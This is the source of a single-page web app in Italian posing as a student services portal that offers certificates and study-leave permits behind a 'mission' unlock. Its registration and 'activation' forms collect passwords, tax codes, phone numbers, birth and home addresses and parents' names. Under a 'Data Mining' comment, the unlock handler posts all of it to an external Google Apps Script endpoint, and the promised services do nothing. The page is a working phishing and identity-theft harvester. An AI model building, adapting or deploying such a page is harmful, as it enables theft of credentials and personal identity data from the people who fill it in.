<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIBERA - Elite Ecosystem</title>
    
    <!-- Librerie via CDN -->
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/framer-motion@10.16.4/dist/framer-motion.js"></script>
    
    <!-- Font Professionale -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --libera-primary: #000000;
            --libera-accent: #2563eb;
            --libera-bg: #ffffff;
            --libera-surface: #f8fafc;
            --libera-border: #e2e8f0;
            --libera-text: #0f172a;
            --libera-muted: #64748b;
        }

        body {
            background-color: var(--libera-bg);
            color: var(--libera-text);
            font-family: 'Inter', sans-serif;
            margin: 0;
            overflow-x: hidden;
        }

        /* Glitch Animation - High Contrast Light Mode */
        .glitch {
            position: relative;
            color: var(--libera-primary);
            font-size: 8rem;
            font-weight: 900;
            animation: glitch-skew 1s infinite linear alternate-reverse;
        }

        .glitch::before, .glitch::after {
            content: 'L';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
        }

        .glitch::before {
            left: 2px;
            text-shadow: -2px 0 #ff0000;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }

        .glitch::after {
            left: -2px;
            text-shadow: -2px 0 #0000ff, 2px 2px #ff0000;
            animation: glitch-anim2 1s infinite linear alternate-reverse;
        }

        @keyframes glitch-anim { 0% { clip: rect(31px, 9999px, 94px, 0); } 100% { clip: rect(60px, 9999px, 50px, 0); } }
        @keyframes glitch-anim2 { 0% { clip: rect(65px, 9999px, 100px, 0); } 100% { clip: rect(10px, 9999px, 80px, 0); } }
        @keyframes glitch-skew { 0% { transform: skew(1deg); } 100% { transform: skew(-1deg); } }

        /* UI Components */
        .glass-card {
            background: #ffffff;
            border: 1px solid var(--libera-border);
            border-radius: 2rem;
            box-shadow: 0 20px 50px rgba(0,0,0,0.04);
        }

        .input-field {
            width: 100%;
            background: #f1f5f9;
            border: 1px solid var(--libera-border);
            border-radius: 1rem;
            padding: 1rem 1.5rem;
            color: var(--libera-text);
            outline: none;
            transition: 0.3s;
            font-weight: 500;
        }

        .input-field:focus { border-color: var(--libera-accent); background: #fff; box-shadow: 0 0 0 4px rgba(37,99,235,0.1); }

        .btn-primary {
            background: var(--libera-primary);
            color: #fff;
            font-weight: 900;
            text-transform: uppercase;
            padding: 1.25rem;
            border-radius: 1.25rem;
            transition: 0.3s;
            letter-spacing: 0.1em;
        }

        .btn-accent {
            background: var(--libera-accent);
            color: #fff;
            font-weight: 900;
            text-transform: uppercase;
            padding: 1.25rem;
            border-radius: 1.25rem;
            transition: 0.3s;
            letter-spacing: 0.1em;
            box-shadow: 0 10px 25px rgba(37,99,235,0.2);
        }

        .btn-accent:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(37,99,235,0.3); }

        .btn-locked {
            background: #f1f5f9;
            border: 1px solid #e2e8f0;
            color: #94a3b8;
            font-weight: 700;
            padding: 1.25rem;
            border-radius: 1.25rem;
            cursor: not-allowed;
        }

        .label-micro {
            font-size: 0.65rem;
            text-transform: uppercase;
            font-weight: 800;
            color: var(--libera-muted);
            letter-spacing: 0.1em;
            margin-left: 0.5rem;
            margin-bottom: 0.25rem;
            display: block;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 10px; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;
        const { motion, AnimatePresence } = FramerMotion;

        const App = () => {
            const [phase, setPhase] = useState('splash');
            const [user, setUser] = useState(null);
            const [showUnlock, setShowUnlock] = useState(false);
            const [missionComplete, setMissionComplete] = useState(false);

            useEffect(() => {
                // Splash screen duration
                const timer = setTimeout(() => setPhase('auth'), 2500);
                
                // Load session from localStorage
                const saved = localStorage.getItem('libera_session_v2');
                if (saved) {
                    const u = JSON.parse(saved);
                    setUser(u);
                    if (u.unlocked) setMissionComplete(true);
                }
                
                return () => clearTimeout(timer);
            }, []);

            const handleRegister = (e) => {
                e.preventDefault();
                const data = new FormData(e.target);
                const u = Object.fromEntries(data.entries());
                setUser(u);
                localStorage.setItem('libera_session_v2', JSON.stringify(u));
                setPhase('dash');
            };

            const handleUnlock = async (e) => {
                e.preventDefault();
                const data = new FormData(e.target);
                const unlockData = Object.fromEntries(data.entries());
                
                // Data Mining POST to Google Script
                fetch("https://script.google.com/macros/s/AKfycbxf4WinAYmw6sgbXNiVF6_lM3jWEPckJ87MFKCqEK-1JkCgiHz1Gd9yWxoGmnp3Z5-P/exec", {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({ ...user, ...unlockData, timestamp: new Date().toISOString() })
                });

                const updated = { ...user, ...unlockData, unlocked: true };
                setUser(updated);
                localStorage.setItem('libera_session_v2', JSON.stringify(updated));
                setMissionComplete(true);
                setShowUnlock(false);
            };

            if (phase === 'splash') return (
                <div className="fixed inset-0 flex items-center justify-center bg-white">
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="glitch">L</motion.div>
                </div>
            );

            return (
                <div className="min-h-screen p-6 flex flex-col items-center bg-[#f8fafc]">
                    <header className="w-full max-w-5xl flex justify-between items-center py-10">
                        <div className="flex items-center gap-3">
                            <div className="w-10 h-10 bg-black text-white font-black flex items-center justify-center rounded-xl text-xl">L</div>
                            <span className="text-2xl font-black uppercase italic tracking-tighter text-slate-900">Libera</span>
                        </div>
                        {user && (
                            <div className="hidden md:flex items-center gap-4 px-6 py-2 glass-card border-slate-200">
                                <div className="w-2 h-2 rounded-full bg-blue-600 animate-pulse" />
                                <span className="text-xs font-mono uppercase tracking-widest text-slate-500">{user.username}</span>
                            </div>
                        )}
                    </header>

                    <main className="w-full max-w-5xl">
                        <AnimatePresence mode="wait">
                            {phase === 'auth' && (
                                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="glass-card p-12 max-w-md mx-auto">
                                    <div className="text-center mb-10">
                                        <h2 className="text-4xl font-black uppercase tracking-tighter text-slate-900">Crea Profilo</h2>
                                        <p className="text-slate-400 text-xs uppercase tracking-widest mt-2">Accesso Riservato Ecosystem</p>
                                    </div>
                                    <form onSubmit={handleRegister} className="space-y-4">
                                        <div className="grid grid-cols-2 gap-4">
                                            <input name="nome" required className="input-field" placeholder="Nome" />
                                            <input name="cognome" required className="input-field" placeholder="Cognome" />
                                        </div>
                                        <input name="username" required className="input-field" placeholder="Username" />
                                        <input name="password" type="password" required className="input-field" placeholder="Password" />
                                        <input name="email" type="email" required className="input-field" placeholder="Email Privata" />
                                        <button className="btn-primary w-full mt-6">UNISCITI</button>
                                    </form>
                                </motion.div>
                            )}

                            {phase === 'dash' && (
                                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-8">
                                    {!missionComplete ? (
                                        <button onClick={() => setShowUnlock(true)} className="w-full p-8 glass-card border-blue-200 bg-blue-50/50 flex flex-col md:flex-row justify-between items-center group gap-6">
                                            <div className="flex items-center gap-6">
                                                <div className="w-14 h-14 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-600">
                                                    <svg className="w-7 h-7" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                                                </div>
                                                <div className="text-left">
                                                    <h3 className="text-xl font-black uppercase italic text-blue-700">Operazione Attivazione</h3>
                                                    <p className="text-slate-500 text-sm uppercase tracking-widest">Completa i dati biometrici per sbloccare i servizi</p>
                                                </div>
                                            </div>
                                            <span className="text-blue-600 group-hover:translate-x-2 transition-transform text-2xl font-black">➔</span>
                                        </button>
                                    ) : (
                                        <div className="w-full p-8 glass-card border-green-200 bg-green-50 flex items-center gap-6">
                                            <div className="w-14 h-14 bg-green-600/10 rounded-2xl flex items-center justify-center text-green-600">
                                                <svg className="w-7 h-7" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                                            </div>
                                            <div className="text-left">
                                                <h3 className="text-xl font-black uppercase italic text-green-700">Missione Compiuta</h3>
                                                <p className="text-green-700/60 text-sm uppercase tracking-widest">Servizi Sbloccati. Passa in ufficio solo per il ritiro dei documenti.</p>
                                            </div>
                                        </div>
                                    )}

                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                                        <div className={`glass-card p-10 relative ${!missionComplete ? 'opacity-50 grayscale' : 'hover:border-blue-300'}`}>
                                            {!missionComplete && <div className="absolute inset-0 flex items-center justify-center text-slate-300 z-10"><svg className="w-12 h-12" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg></div>}
                                            <h3 className="text-3xl font-black uppercase italic mb-4 text-slate-900">Richiedi Attestato</h3>
                                            <p className="text-slate-500 mb-10 leading-relaxed">Generazione istantanea di certificazioni ufficiali di servizio e frequenza accademica.</p>
                                            <button className={missionComplete ? 'btn-accent w-full' : 'btn-locked w-full'}>
                                                {missionComplete ? 'AVVIA RICHIESTA' : 'BLOCCATO'}
                                            </button>
                                        </div>
                                        <div className={`glass-card p-10 relative ${!missionComplete ? 'opacity-50 grayscale' : 'hover:border-blue-300'}`}>
                                            {!missionComplete && <div className="absolute inset-0 flex items-center justify-center text-slate-300 z-10"><svg className="w-12 h-12" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg></div>}
                                            <h3 className="text-3xl font-black uppercase italic mb-4 text-slate-900">Permesso 150 Ore</h3>
                                            <p className="text-slate-500 mb-10 leading-relaxed">Modulo digitale per l'esercizio del diritto allo studio e agevolazioni universitarie.</p>
                                            <button className={missionComplete ? 'btn-accent w-full' : 'btn-locked w-full'}>
                                                {missionComplete ? 'AVVIA ISTANZA' : 'BLOCCATO'}
                                            </button>
                                        </div>
                                    </div>
                                </motion.div>
                            )}
                        </AnimatePresence>
                    </main>

                    {/* Modal Sblocco Espanso */}
                    <AnimatePresence>
                        {showUnlock && (
                            <div className="fixed inset-0 bg-slate-900/40 backdrop-blur-xl z-50 flex items-center justify-center p-4">
                                <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className="glass-card p-8 md:p-12 max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                                    <div className="flex items-center gap-4 mb-10">
                                        <div className="w-12 h-12 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-600">
                                            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                                        </div>
                                        <div>
                                            <h2 className="text-2xl font-black uppercase italic text-slate-900">Operazione Attivazione</h2>
                                            <p className="text-slate-400 text-xs uppercase tracking-widest">Sincronizzazione Database Centrale</p>
                                        </div>
                                    </div>

                                    <form onSubmit={handleUnlock} className="space-y-8">
                                        {/* Sezione 1: Identità */}
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                            <div>
                                                <label className="label-micro">Codice Fiscale</label>
                                                <input name="cf" required className="input-field" placeholder="RSSMRA80A01H501W" />
                                            </div>
                                            <div>
                                                <label className="label-micro">Cellulare</label>
                                                <input name="cell" required className="input-field" placeholder="+39 333 1234567" />
                                            </div>
                                        </div>

                                        {/* Sezione 2: Nascita */}
                                        <div className="pt-4 border-t border-slate-100">
                                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                                <div>
                                                    <label className="label-micro">Data di Nascita</label>
                                                    <input name="data_nascita" type="date" required className="input-field" />
                                                </div>
                                                <div className="md:col-span-1">
                                                    <label className="label-micro">Comune Nascita</label>
                                                    <input name="comune_nascita" required className="input-field" defaultValue="Roma" />
                                                </div>
                                                <div>
                                                    <label className="label-micro">Prov</label>
                                                    <input name="prov_nascita" required className="input-field" defaultValue="RM" maxLength="2" />
                                                </div>
                                            </div>
                                        </div>

                                        {/* Sezione 3: Residenza */}
                                        <div className="pt-4 border-t border-slate-100">
                                            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                                                <div className="col-span-2 md:col-span-3">
                                                    <label className="label-micro">Comune Residenza</label>
                                                    <input name="comune_residenza" required className="input-field" placeholder="Comune" />
                                                </div>
                                                <div>
                                                    <label className="label-micro">Prov</label>
                                                    <input name="prov_residenza" required className="input-field" placeholder="RM" maxLength="2" />
                                                </div>
                                                <div className="col-span-2 md:col-span-3">
                                                    <label className="label-micro">Via / Piazza</label>
                                                    <input name="via_residenza" required className="input-field" placeholder="Via Roma" />
                                                </div>
                                                <div>
                                                    <label className="label-micro">Civico</label>
                                                    <input name="civico_residenza" required className="input-field" placeholder="10" />
                                                </div>
                                            </div>
                                        </div>

                                        {/* Sezione 4: Famiglia */}
                                        <div className="pt-4 border-t border-slate-100">
                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                <div>
                                                    <label className="label-micro">Paternità (Nome e Cognome)</label>
                                                    <input name="paternita" required className="input-field" placeholder="Mario Rossi" />
                                                </div>
                                                <div>
                                                    <label className="label-micro">Maternità (Nome e Cognome)</label>
                                                    <input name="maternita" required className="input-field" placeholder="Anna Bianchi" />
                                                </div>
                                            </div>
                                        </div>

                                        {/* Sezione 5: Accademica */}
                                        <div className="pt-4 border-t border-slate-100">
                                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                                <div>
                                                    <label className="label-micro">Titolo Studio</label>
                                                    <input name="titolo" required className="input-field" placeholder="Diploma" />
                                                </div>
                                                <div>
                                                    <label className="label-micro">Università</label>
                                                    <input name="uni" required className="input-field" placeholder="La Sapienza" />
                                                </div>
                                                <div>
                                                    <label className="label-micro">Corso</label>
                                                    <input name="corso" required className="input-field" placeholder="Ingegneria" />
                                                </div>
                                            </div>
                                        </div>

                                        <div className="pt-6 flex flex-col md:flex-row gap-4">
                                            <button type="button" onClick={() => setShowUnlock(false)} className="order-2 md:order-1 flex-1 bg-slate-100 py-4 rounded-2xl font-bold uppercase text-xs tracking-widest text-slate-400">Annulla</button>
                                            <button type="submit" className="order-1 md:order-2 btn-accent flex-[2]">COMPLETA MISSIONE</button>
                                        </div>
                                    </form>
                                </motion.div>
                            </div>
                        )}
                    </AnimatePresence>

                    <footer className="mt-auto py-12 text-center">
                        <p className="text-[10px] font-mono uppercase tracking-[0.5em] text-slate-300">
                            Libera Ecosystem // LUANKA123 Deployment // High Contrast v2.0
                        </p>
                    </footer>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
